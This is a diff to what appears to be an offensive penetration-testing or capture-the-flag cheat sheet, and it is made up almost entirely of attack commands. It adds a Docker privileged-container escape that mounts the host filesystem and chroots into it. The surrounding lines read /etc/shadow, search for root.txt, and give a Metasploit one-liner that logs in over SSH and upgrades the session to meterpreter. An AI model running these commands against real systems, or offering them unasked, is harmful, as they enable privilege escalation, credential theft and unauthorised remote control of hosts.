@@ -859,6 +859,12 @@ find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
 +---------- Looking at /etc/shadow ----------+
 cat /etc/shadow
 
+[*] Containers
++---------- Docker ----------+
+docker ps -a
+docker commit 35c090009763 tempimg
+docker run -it --rm --privileged -v /:/mnt tempimg chroot /mnt sh
+
 
 [*] Meterpreter
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'
